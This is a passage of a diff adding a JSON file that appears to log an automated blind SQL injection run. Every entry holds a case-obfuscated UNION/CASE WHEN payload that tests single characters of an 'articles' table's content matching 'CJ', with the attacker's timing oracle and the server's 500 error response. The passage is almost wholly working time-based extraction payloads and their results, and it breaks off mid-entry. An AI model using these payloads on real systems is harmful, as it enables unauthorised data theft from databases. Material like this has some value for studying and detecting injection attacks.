@@ -1,0 +1,732 @@
+[
+  {
+    "query": "{\"query\":\"0xf696' AND 1114 uNion SeLeCT 0X66a6,(SeLECt cAsE WheN ((SeLecT UnicoDe(sUBSTR(cONTenT,-23,1)) from ARTICLEs WhERE cONTENT lIKe '%CJ%')%(sElect UniCODe(SUbsTr(cONteNt,-18,1)) FROm arTiclES wHERe contENT lIke '%cJ%')) likE 52 theN hEx(RAndombLoB(1500000000/2)) ELSE Hex(rANDoMbLoB(1000000000/2)) EnD),28 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3183.878000020549
+  },
+  {
+    "query": "{\"query\":\"0x3D77' and -512 UniON SeLECt 0x69C,(SelEct case wHEN ((SelEcT uNICode(sUbstR(conTenT,-42,1)) FrOM arTiCLeS WheRE coNTenT lIKE '%CJ%')*(sElect UNiCODE(SuBsTr(CONtEnT,-36,1)) froM ARtiClES WhEre COntent liKe '%cJ%')) lIKE 6888 then hex(RAndOmblOb(1000000000/2)) else hex(raNdomBlob(1500000000/2)) End),7 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2471.4400000189316
+  },
+  {
+    "query": "{\"query\":\"0X8408' And 1496 union seLEct 0xC697,(SeLECt CASe wHEn ((sEleCT uNIcodE(SUbsTr(ConTenT,0x1,1)) FRom artIClEs wHeRE cOntENT liKe '%CJ%')*(sELECt uNicode(SubSTr(cONTenT,-35,1)) FRoM ARTIcLES WhEre CoNTenT Like '%cj%')) likE 6700 THeN HEx(rANdOmBLOB(1000000000/2)) Else heX(raNdOmbLoB(1500000000/2)) End),73 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2576.1000000251197
+  },
+  {
+    "query": "{\"query\":\"0XEbf8' AnD -1568 union SeLect 0X3dB3,(sELeCT case WhEn (Hex((seleCT UnICODe(SUbStr(ConTenT,-2,1)) fROm aRTiCles WHeRE CONtent likE '%cj%')%(Select uNicODE(SuBsTr(contEnt,-39,1)) froM articles whERE ConTEnt lIKe '%CJ%')-(Select UnICOde(SubsTR(COntENt,-48,1)) FRoM aRtIcLeS Where CoNteNt LIke '%cj%'))) likE '2d3232' THEn HEx(RAnDomblOB(1500000000/2)) eLSE hEX(RANdomblob(1000000000/2)) eND),75 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3169.7950000117644
+  },
+  {
+    "query": "{\"query\":\"0X3cF5' and 2685 uNION SELECt 0x3F96,(selEct cASe whEN (heX((SELect uNiCOdE(SUbStR(COntenT,-23,1)) From articLes whERE cONTenT LiKe '%cJ%')*(selEcT UNICoDE(SubStR(contEnt,0x12,1)) frOM ArtIClEs WhERe COntenT lIkE '%cj%')-(select UnicodE(SUbsTR(COnTeNt,0x9,1)) FRoM ArtiCleS whErE CONTeNt lIKe '%CJ%'))) liKE '35323031' tHeN hex(RaNdOMBLOb(1500000000/2)) ELse HEx(rANDOmBlOb(1000000000/2)) eND),57 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3151.4630000048433
+  },
+  {
+    "query": "{\"query\":\"0xC577' aNd -213 unIOn seLect 0X63E,(sELeCT caSe WHEN ((SEleCT UNicode(SUbStr(cOnTent,-36,1)) from ARticLEs WhErE conteNT LIke '%CJ%')+(seleCT unicode(SUBsTR(cOntenT,-30,1)) fRoM ARTicleS wheRE ContEnt LIkE '%Cj%')) LIkE 106 thEn HEX(RanDombLOB(1500000000/2)) ELSE HEx(RAnDOmBLob(1000000000/2)) eND),-77 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3192.899000035666
+  },
+  {
+    "query": "{\"query\":\"0xF6cb' and 273 unION sELEcT 0X9027,(SeLect CASe wheN (Hex((seLecT UNiCoDE(sUbStr(COntEnT,0x2c,1)) From arTIcLes wHerE cONtENt likE '%cJ%')%(selecT UniCODe(SuBstr(contENT,0XB,1)) FrOm arTicLEs wHERe COnTeNT LIKe '%Cj%')+(sELect UnICode(sUbsTR(ConTENT,-47,1)) froM aRTIcLES wHeRe cOnTEnt liKE '%CJ%'))) LIKe '313231' tHEn HEX(RANDOMbloB(1500000000/2)) elsE HeX(RanDoMBlOB(1000000000/2)) EnD),58 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3163.1859999713824
+  },
+  {
+    "query": "{\"query\":\"0x48Ff' anD 1074 uNION selECT 0X7bC7,(SELECT CaSe wHeN (hex((sELect unicOdE(SUbSTr(CONtEnt,-46,1)) from ArtIcLEs WHERe coNtEnT LIKe '%Cj%')-(SelEcT unICoDe(subSTr(coNtent,0x23,1)) fROm ArTiClEs wHERe COnteNt lIKE '%Cj%')*(SEleCt unICODE(subStR(contEnt,-4,1)) fRoM aRTIcLes wheRe CONTENT Like '%cJ%'))) lIke '2d34393934' tHeN Hex(RaNdomBlob(1000000000/2)) eLsE HEX(randoMBlob(1500000000/2)) eNd),95 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2593.2769999979023
+  },
+  {
+    "query": "{\"query\":\"0xF27f' aND 1391 UnIon sELEcT 0Xe373,(selECt cASe when (HeX((SELECT uNICode(SubstR(COnTenT,0x11,1)) froM aRTIclEs WhErE CoNtent LIKE '%CJ%')*(sELeCt UNicodE(SUbStR(cOntEnT,0X24,1)) FroM aRtIcLeS WHERe COnTenT LikE '%cj%')*(selECt UnICoDe(suBSTr(coNteNt,-28,1)) FroM artIcLes WHERe coNTenT lIkE '%Cj%'))) lIKE '323937303030' thEN HEX(RaNDOmblOb(1000000000/2)) ElsE heX(RANDOmblob(1500000000/2)) eND),54 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2466.512999979932
+  },
+  {
+    "query": "{\"query\":\"0X65d7' aNd -2398 uNION SeleCt 0X920f,(selECt CasE WHEn (hEX((sELECT uNIcODE(SuBSTr(CoNtenT,-18,1)) fRom aRTiCLES WhEre ContENt LiKE '%CJ%')*(SElEcT uNIcoDe(SUBstr(conTeNt,-26,1)) FRoM ARticlEs WhERe conteNt LIKE '%Cj%')*(sEleCt unICODE(suBSTR(COntent,-26,1)) fRom artIcles wHeRe CONTenT LIkE '%Cj%'))) lIkE '393232303832' thEn Hex(raNDOmBlOb(1000000000/2)) elSe HeX(rAnDoMBloB(1500000000/2)) eNd),59 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2454.517999972414
+  },
+  {
+    "query": "{\"query\":\"0X68ac' And 1119 uNioN SELECt 0X8B84,(selECt cAsE WhEN ((SELEcT uNICoDE(sUbsTr(content,-29,1)) fROM ARTiClES where CONteNt liKE '%cj%')%(SelECt unIcOdE(SUBStr(cONtENT,0X2c,1)) FROm aRticLeS WheRe CoNtEnT liKe '%cJ%')+(SeLECT UNICoDE(SubsTr(coNTenT,0xd,1)) FROm arTICles wHERE ConteNT lIkE '%CJ%')) Like 57 theN HeX(RandombLOb(1500000000/2)) ElSe hEx(raNDOmBLOB(1000000000/2)) enD),-27 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3173.6979999946316
+  },
+  {
+    "query": "{\"query\":\"0X7c90' and 2005 unIOn seLEct 0x2255,(seLEct CASe WHEN (HEX((SeLECt unicODe(SubSTR(cOnTEnT,-46,1)) FRom arTICLeS wHere coNteNt liKE '%CJ%')*(selECT UnicoDE(SubSTr(CoNteNt,0x26,1)) FROm aRtIcleS WHERE COnteNt liKE '%cj%')%(SELECT UnIcOdE(subStR(coNTENT,0XB,1)) frOm aRTiCLes WHErE CoNtent LIKe '%CJ%'))) likE '3436' THEN hex(rAndoMbLOB(1500000000/2)) ElsE heX(RaNDOmBLOB(1000000000/2)) End),-12 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3342.1189999993853
+  },
+  {
+    "query": "{\"query\":\"0XAf8' aND -137 uNIoN seLEcT 0XFD84,(sELECt CaSE WhEN ((sElect uNicoDE(suBsTr(cOnTENT,-33,1)) frOm aRtIcLES WHERe coNTeNT lIKE '%CJ%')%(SELEcT uniCoDe(SubsTr(CoNteNt,-32,1)) fRom ARTICLEs WhERE coNteNT LIkE '%cj%')) liKe 49 thEN HEX(RANdOmBLob(1000000000/2)) eLSE hEX(ranDOmbLOB(1500000000/2)) END),-23 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2461.0839999938385
+  },
+  {
+    "query": "{\"query\":\"0X9b1F' aNd -1509 UniON SEleCt 0X25Dc,(seleCT CAsE When ((SElect uNiCODE(suBStR(coNtEnt,0x17,1)) FroM ARtiClEs wHerE CoNTENT lIkE '%Cj%')-(seLEct UnIcOdE(SUBSTr(conTenT,-1,1)) FROm aRticLes WheRE COnTENt LIke '%CJ%')) LIKe -28 tHEN HEx(RANDOMblOb(1000000000/2)) ElSE HEx(rAndoMBlob(1500000000/2)) ENd),27 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2646.1360000149907
+  },
+  {
+    "query": "{\"query\":\"0x6c16' AND 1650 unIOn sELECt 0xA3Bd,(SELeCt cAsE wheN (HEX((sEleCt uniCoDe(sUbstr(CoNtent,-2,1)) fROM artICLes WHerE contEnt LIkE '%CJ%')*(seLEcT unIcodE(SUbstR(COntent,-48,1)) fROm ArtIcleS wHErE cOnTeNT like '%Cj%'))) like '36343939' tHEn hEx(randoMbLoB(1500000000/2)) ELsE heX(rAndomBLob(1000000000/2)) END),3 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3171.715000029083
+  },
+  {
+    "query": "{\"query\":\"0xC0D' and 88 Union SeLEcT 0xe0b9,(SELECT cASe wHEn ((seLECT UnIcode(SubsTr(cOnTenT,0x21,1)) fRoM aRticLes WheRE contenT LiKe '%Cj%')-(SELECT unicODE(subsTr(coNTent,0x19,1)) froM ARtIclES WherE ContEnT lIKe '%cJ%')) LiKe 1 ThEn hEx(raNdomBLob(1000000000/2)) ElSe Hex(RandomBloB(1500000000/2)) END),-89 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2937.483000008259
+  },
+  {
+    "query": "{\"query\":\"0X83f5' and 1557 UnIOn SeleCt 0X3F08,(sElECT casE WhEn ((sELeCt UnicODE(SUBstr(cONteNT,-43,1)) FroM ARTIClES WHEre cONTeNt LIKE '%cJ%')*(SeLecT unICoDE(sUbstr(CoNtEnt,-6,1)) fROm aRTiCLES wHERE COnTent like '%Cj%')) LIKe 5151 tHEN HEX(RAnDoMblob(1000000000/2)) elSe hEx(randOMbLOB(1500000000/2)) eND),-18 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2448.884999986634
+  },
+  {
+    "query": "{\"query\":\"0X3Cf0' aND 1987 UNION SELect 0Xeb9b,(SELECt cASe WHEN ((sELEcT UNICodE(SUbstr(cONTEnt,-8,1)) FRoM ArTicleS WHERe CoNTEnT lIke '%CJ%')*(sELEcT uNIcOde(SubsTR(conTenT,-3,1)) frOM aRtICleS wheRe cOntEnT lIKE '%cJ%')) lIke 5252 THEn Hex(ranDoMBLOb(1000000000/2)) else heX(raNDoMBLoB(1500000000/2)) END),-97 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2445.481000012286
+  },
+  {
+    "query": "{\"query\":\"0xBe74' AnD 1518 UNIoN sElECT 0x20E0,(SELEct caSe WHEN (HEX((SelEct uNiCode(SuBsTR(CoNtEnT,0X21,1)) FROm ArTiCLeS WhERe ConteNT likE '%cJ%')%(SEleCT uNIcode(sUBStR(cOntENT,0X7,1)) FROm ArTIcLes WherE conTEnt LiKe '%cj%')*(sELeCt uNIcodE(SuBsTR(CoNteNT,-24,1)) FROM ArTIcles WherE CoNTenT like '%cJ%'))) Like '32343530' tHEn HeX(rAnDOMbLOB(1500000000/2)) elSE HEx(rAndomBlOb(1000000000/2)) ENd),-80 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3149.3210000003573
+  },
+  {
+    "query": "{\"query\":\"0x18bC' And 2789 UNIon seLeCT 0X3C81,(SELECT CasE when ((sEleCT UNIcODE(sUBSTr(ConTeNT,-17,1)) frOm arTICleS whERE coNtENt like '%cJ%')-(seLect UnICODe(SubStr(COnTent,-14,1)) fROm ARTIclES WHeRe cONtEnT Like '%CJ%')) LIKE -2 thEN HEx(RaNDoMBLOB(1500000000/2)) eLse HEX(RAnDombLOB(1000000000/2)) end),18 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3176.720999955397
+  },
+  {
+    "query": "{\"query\":\"0X9832' anD 2823 UniOn seLect 0Xd950,(SElEcT CASE WHEN ((Select unICodE(subStr(conTeNT,-48,1)) fRom ArtIClEs WheRE ConteNT lIKE '%CJ%')+(SELecT uNiCOde(subStR(cOntEnT,0X16,1)) froM ArTIcleS whERe CONTEnT LIke '%CJ%')) LIKE 122 THeN hEx(RaNdOmbLoB(1500000000/2)) ELSe HEx(RAnDOMblob(1000000000/2)) eND),49 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3140.262999994032
+  },
+  {
+    "query": "{\"query\":\"0xB82e' AND 836 Union SeLECt 0x16e9,(sElEcT caSe wHeN ((SELEct uniCOde(substR(coNtENt,0x10,1)) FROm ArTiCles wHeRE COnteNt liKe '%cj%')*(SEleCt UNiCodE(substR(COntenT,-12,1)) FroM arTiclEs wHErE cOntEnT lIke '%cJ%')%(seLeCT uNICODE(suBStr(cONTEnT,-14,1)) FRom articLEs WHerE contEnt lIkE '%CJ%')) like 18 ThEN HeX(randoMblob(1000000000/2)) ElsE hEx(RaNdoMBloB(1500000000/2)) enD),100 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2445.9969999984723
+  },
+  {
+    "query": "{\"query\":\"0x8EcA' aND 1505 uNion selEcT 0xfA0a,(seLect case WHeN (HeX((seLEct UnIcODE(SUbStR(CoNTEnT,0x3,1)) frOm ARtIcLes wheRe cOntenT liKE '%CJ%')*(SELecT unICodE(SUbStR(CoNTenT,0X1E,1)) FrOM ArTiClEs Where CONtEnT LikE '%cj%')-(sELect UNICoDe(SUbSTR(cOntent,-2,1)) FROm ArticlES WheRE ConteNt LiKe '%Cj%'))) LIKe '32343533' tHeN HEX(rANDoMblob(1500000000/2)) eLsE heX(RANdombLoB(1000000000/2)) end),-5 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3365.433000015326
+  },
+  {
+    "query": "{\"query\":\"0x8c5d' And -2977 uNiON SeleCT 0xb856,(SeLeCT CASE WHeN ((selECt unIcODE(sUbSTR(CoNtent,0x2B,1)) fROM ArTicleS WhErE COnTENT likE '%Cj%')-(sElecT UniCoDe(sUbSTr(cOntENt,-22,1)) FRom aRtIcLES whERe coNTEnt LikE '%cj%')%(seLecT UNiCoDE(sUBsTR(coNtEnT,-33,1)) frOm aRTICLEs WHere coNtEnt lIkE '%cj%')) LiKE 100 tHen hex(RANdOmBlOB(1000000000/2)) eLsE HEX(ranDoMbLoB(1500000000/2)) End),19 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2446.916000011273
+  },
+  {
+    "query": "{\"query\":\"0x3916' anD 2381 unIon selEcT 0X9D4B,(sELECT cASe when ((SeLecT unICoDE(SUbSTr(contEnT,0X4,1)) FRom arTIcLES wHeRE cONTeNt lIke '%Cj%')*(SELecT unICoDe(SUbStR(conteNt,-2,1)) fROM ARtICLeS wHERE COnTenT LIKE '%CJ%')) likE 4656 theN hEX(RaNdoMBLoB(1500000000/2)) ELSE hEX(RAnDOmBLob(1000000000/2)) end),-98 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3165.364999989409
+  },
+  {
+    "query": "{\"query\":\"0x9f6' AND -2768 unIoN SEleCT 0Xe418,(SElECT CASE WHeN ((Select UNICodE(SUBstr(ConTEnt,0X1B,1)) fRom artICleS WHerE coNteNT likE '%cJ%')*(sELEct unICOde(SUBStr(CoNTent,0x2c,1)) froM artiCleS WhERe cOnTEnT LiKE '%CJ%')%(seLeCT unICOde(SuBstr(ContenT,0X7,1)) frOM arTiClEs WheRE ConTent LIke '%Cj%')) like 36 ThEn hEx(RaNDOmblOB(1500000000/2)) eLsE HeX(RaNDomBlOb(1000000000/2)) ENd),72 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3137.4500000128187
+  },
+  {
+    "query": "{\"query\":\"0X4c44' and 1058 UniOn SeLECT 0x2C86,(SeLECt CAsE whEn (HeX((SElecT UNIcoDe(SUBstR(CONtEnt,0x30,1)) FROm artiCLES whErE CoNtent LIKe '%cj%')%(SelECT unicode(sUbsTr(COntENt,0x29,1)) fROM ArticlES wHeRE CoNtEnt liKE '%cj%'))) LiKE '3231' theN hex(rAndOMBlOB(1000000000/2)) ELSE HEx(raNdoMBlOB(1500000000/2)) end),74 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2424.015999971319
+  },
+  {
+    "query": "{\"query\":\"0X72Fe' and 2881 UNION sEleCt 0X5c81,(SeleCT CASE wheN ((sELect UNICoDE(SubsTr(ConTENt,-15,1)) FroM ArtiCLeS wheRe coNTeNT LiKe '%cj%')*(sElEct uNIcode(suBSTR(COntEnt,-5,1)) FROM arTIClEs whEre CoNTeNt LIke '%CJ%')-(SElEct UNICoDE(sUbSTr(cOntENt,-14,1)) fRom arTiCLEs wHEre CONTeNT lIKE '%cj%')) LIkE 5200 THen hex(rAnDOmBLOb(1000000000/2)) ElsE HEX(rAndOMBlOB(1500000000/2)) END),-90 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2442.916999995906
+  },
+  {
+    "query": "{\"query\":\"0x1039' aND -1651 unION sELeCt 0X2b34,(selECt caSE When (HEX((sELecT uNiCODe(subSTR(CoNtEnt,0X12,1)) fRoM artIcLES WhErE cOnteNT lIkE '%cJ%')-(seLeCT UNIcODe(SUbstR(cOnTENt,0X1A,1)) frOm aRTICleS wherE CoNtEnT LikE '%CJ%'))) lIKe '3439' theN hEx(RanDOMbLOB(1500000000/2)) ELsE HeX(randoMBLOB(1000000000/2)) end),-64 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3345.394000008546
+  },
+  {
+    "query": "{\"query\":\"0XA23B' anD 927 uNIOn SEleCt 0Xf404,(SELECT caSe WHEN ((sELeCt unICODE(subStr(cOnTEnt,0X11,1)) FRoM arTiCLeS WheRe coNtenT LiKE '%Cj%')-(seLecT UNicODe(SuBsTr(coNtEnt,0x20,1)) FroM aRTICleS whERE conteNT Like '%Cj%')) likE 4 TheN HEX(RANdOMblOb(1000000000/2)) ElSE hex(rAndOmbLOB(1500000000/2)) eNd),-70 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2636.0310000416935
+  },
+  {
+    "query": "{\"query\":\"0x8a4f' ANd -1684 uniOn selEct 0xB684,(SeLect CAsE WHen (HEx((SEleCT uNiCODE(SUbsTR(CoNTEnt,-10,1)) FrOM ARTIclEs WheRe CONTenT lIKe '%cj%')-(sElEcT UnicoDe(SUbstr(COnTenT,0X10,1)) frOm arTiClES WhErE COnTEnt LiKE '%cj%')+(SELeCT uNICode(SubStr(cOnteNt,0x26,1)) frOM ARTIcleS WHeRe cONTEnt LikE '%CJ%'))) like '3538' THEN HEX(rANDOmBLoB(1000000000/2)) elSe hex(rANdoMBLoB(1500000000/2)) eNd),-91 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2457.5520000365636
+  },
+  {
+    "query": "{\"query\":\"0X7271' anD -2983 uNIOn sELect 0X8d7b,(SELeCT CasE WHEN ((SELECT UNicoDE(SuBSTR(cONtEnT,0X7,1)) FRoM ArticleS wHeRe coNTEnt likE '%cJ%')+(sELECt uNIcoDe(SubSTR(ConTEnT,-44,1)) fRom artIcleS WhERe ConteNT LIkE '%Cj%')) LikE 943 ThEn hEX(raNDombLoB(1500000000/2)) eLsE hEX(RAndomBLob(1000000000/2)) enD),-44 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3051.4769999828823
+  },
+  {
+    "query": "{\"query\":\"0XA161' aND 2706 unioN selECt 0X5310,(seleCT cAse wHen (Hex((seLECT uNICODe(sUBsTr(cONTent,0X2A,1)) FrOm articlES WheRe COnTeNt lIKE '%CJ%')*(sEleCT uniCodE(sUbStr(COnteNT,-41,1)) fROm aRTiCles WhEre contEnt liKE '%CJ%')+(SelECT uNiCODE(SuBStr(conTENT,0X20,1)) from artIclES WheRE cONTENt lIKe '%CJ%'))) LIKE '35353739' tHEN hex(ranDomBLOb(1000000000/2)) elsE Hex(RAnDOmbLob(1500000000/2)) enD),93 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2449.3490000272986
+  },
+  {
+    "query": "{\"query\":\"0Xb56f' and -1337 UnION SELecT 0X406F,(SelecT case wHen (HeX((sELeCT unIcODE(suBStr(ConTenT,0x5,1)) FrOm ArtiClEs WhEre contENt LIKE '%cj%')*(sELect uNIcOde(SuBsTR(conTenT,-41,1)) from ArticLEs wheRE COnTeNt Like '%CJ%')%(seLEcT UNIcODE(sUbStr(cONtEnT,-29,1)) froM ARticles wheRE COnTeNT LIkE '%cj%'))) LIke '3536' thEN hex(randombLoB(1500000000/2)) else hex(RaNdomBLOb(1000000000/2)) enD),77 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
